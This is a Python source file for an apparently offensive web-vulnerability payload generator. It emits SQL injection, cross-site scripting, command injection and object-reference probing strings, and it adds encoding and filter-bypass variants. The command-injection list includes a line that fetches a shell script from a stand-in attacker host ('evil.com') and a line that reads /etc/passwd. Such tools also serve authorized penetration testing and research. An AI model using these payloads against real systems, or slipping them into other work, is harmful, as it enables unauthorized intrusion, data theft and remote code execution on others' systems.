"""
Advanced Payload Generator - Creates intelligent, adaptive payloads
"""

import random
import string
import base64
import urllib.parse
from typing import Dict, Any, List, Optional

class PayloadGenerator:
    """Generates various types of payloads for different vulnerabilities"""
    
    def __init__(self):
        self.payload_cache = {}
        
    def generate_sqli_payloads(self, db_type: str = None, technique: str = 'adaptive') -> List[str]:
        """Generate SQL injection payloads based on database type"""
        
        # Base payloads
        payloads = []
        
        if technique == 'error_based':
            payloads = self._get_error_based_sqli(db_type)
        elif technique == 'boolean_based':
            payloads = self._get_boolean_based_sqli(db_type)
        elif technique == 'time_based':
            payloads = self._get_time_based_sqli(db_type)
        elif technique == 'union_based':
            payloads = self._get_union_based_sqli(db_type)
        else:
            # Adaptive - mix of all
            payloads = (
                self._get_error_based_sqli(db_type) +
                self._get_boolean_based_sqli(db_type) +
                self._get_time_based_sqli(db_type) +
                self._get_union_based_sqli(db_type)
            )
        
        # Add variants
        variants = []
        for payload in payloads[:5]:  # Limit to first 5
            variants.extend(self._generate_variants(payload))
        
        return list(set(payloads + variants))[:15]  # Return unique, max 15
    
    def _get_error_based_sqli(self, db_type: str = None) -> List[str]:
        """Error-based SQL injection payloads"""
        payloads = [
            "'",
            '"',
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            "' AND 1=CONVERT(int, @@version)--",
            "1' AND 1=CAST((SELECT version()) AS int)--"
        ]
        
        if db_type == 'MySQL':
            payloads.extend([
                "' OR extractvalue(1,concat(0x7e,version()))--",
                "' AND 1=1 AND SLEEP(5)--"
            ])
        elif db_type == 'PostgreSQL':
            payloads.extend([
                "' AND 1=CAST((SELECT version()) AS int)--",
                "' AND 1::int=1--"
            ])
        elif db_type == 'MSSQL':
            payloads.extend([
                "' AND 1=CONVERT(int, @@version)--",
                "1' AND 1=1 WAITFOR DELAY '0:0:5'--"
            ])
        
        return payloads
    
    def _get_boolean_based_sqli(self, db_type: str = None) -> List[str]:
        """Boolean-based SQL injection payloads"""
        payloads = [
            "' AND '1'='1",
            "' AND '1'='2",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' OR 1=1--",
            "' OR 1=2--"
        ]
        return payloads
    
    def _get_time_based_sqli(self, db_type: str = None) -> List[str]:
        """Time-based SQL injection payloads"""
        payloads = [
            "' AND SLEEP(5)--",
            "' AND IF(1=1, SLEEP(5), 0)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'--"
        ]
        return payloads
    
    def _get_union_based_sqli(self, db_type: str = None) -> List[str]:
        """Union-based SQL injection payloads"""
        payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "' UNION SELECT version(), NULL--",
            "' UNION SELECT database(), user()--"
        ]
        return payloads
    
    def generate_xss_payloads(self, context: str = 'html', bypass_filter: bool = False) -> List[str]:
        """Generate XSS payloads based on context"""
        
        payloads = []
        
        # Basic payloads
        if context == 'html':
            payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>"
            ]
        elif context == 'attribute':
            payloads = [
                '"><script>alert(1)</script>',
                '" onmouseover=alert(1) "',
                "' onfocus=alert(1) '",
                '"><img src=x onerror=alert(1)>'
            ]
        elif context == 'javascript':
            payloads = [
                "';alert(1);//",
                '";alert(1);//',
                "';alert(1);'",
                '";alert(1);"',
                "javascript:alert(1)"
            ]
        
        # Add bypass techniques
        if bypass_filter:
            bypassed = []
            for payload in payloads:
                bypassed.extend(self._bypass_xss_filters(payload))
            payloads.extend(bypassed)
        
        return list(set(payloads))[:15]
    
    def _bypass_xss_filters(self, payload: str) -> List[str]:
        """Generate variants to bypass XSS filters"""
        variants = []
        
        # Case variation
        variants.append(payload.swapcase())
        
        # Double encoding
        encoded = payload.replace('<', '%3C').replace('>', '%3E')
        variants.append(encoded)
        
        # Using different tags
        if 'script' in payload:
            variants.append(payload.replace('script', 'ScRiPt'))
            variants.append(payload.replace('script', 'SCRIPT'))
        
        # Using event handlers
        if 'alert' in payload:
            variants.append(payload.replace('alert', 'confirm'))
            variants.append(payload.replace('alert', 'prompt'))
        
        return variants
    
    def generate_command_payloads(self, os_type: str = 'auto') -> List[str]:
        """Generate command injection payloads"""
        
        payloads = []
        
        if os_type == 'Linux' or os_type == 'auto':
            payloads.extend([
                "; whoami",
                "| whoami",
                "&& whoami",
                "|| whoami",
                "`whoami`",
                "$(whoami)",
                "; id",
                "| id",
                "&& cat /etc/passwd",
                "; wget http://evil.com/shell.sh"
            ])
        
        if os_type == 'Windows' or os_type == 'auto':
            payloads.extend([
                "& whoami",
                "| whoami",
                "&& whoami",
                "|| whoami",
                "%COMSPEC% /c whoami",
                "& ipconfig",
                "| systeminfo",
                "& type C:\\Windows\\win.ini"
            ])
        
        return list(set(payloads))[:15]
    
    def generate_idor_payloads(self, original_id: str = '1') -> List[str]:
        """Generate IDOR payloads"""
        
        payloads = [
            '0', '2', '3', '5', '10', '100', '999', '1000',
            '-1', 'null', 'NULL', 'admin', 'administrator',
            'root', 'test', 'user', 'guest', 'anonymous'
        ]
        
        # Generate numeric variations
        if original_id.isdigit():
            base = int(original_id)
            payloads.extend([
                str(base + 1),
                str(base - 1),
                str(base + 10),
                str(base - 10),
                str(base * 2)
            ])
        
        # Generate encoded versions
        encoded = []
        for payload in payloads[:10]:
            encoded.append(base64.b64encode(payload.encode()).decode())
            encoded.append(urllib.parse.quote(payload))
        
        payloads.extend(encoded)
        
        return list(set(payloads))[:20]
    
    def _generate_variants(self, payload: str) -> List[str]:
        """Generate variants of a payload"""
        variants = []
        
        # URL encode
        variants.append(urllib.parse.quote(payload))
        
        # Double URL encode
        variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # Hex encode
        variants.append('0x' + payload.encode().hex())
        
        # Add comments
        if "'" in payload:
            variants.append(payload.replace("'", "'/**/"))
        
        return variants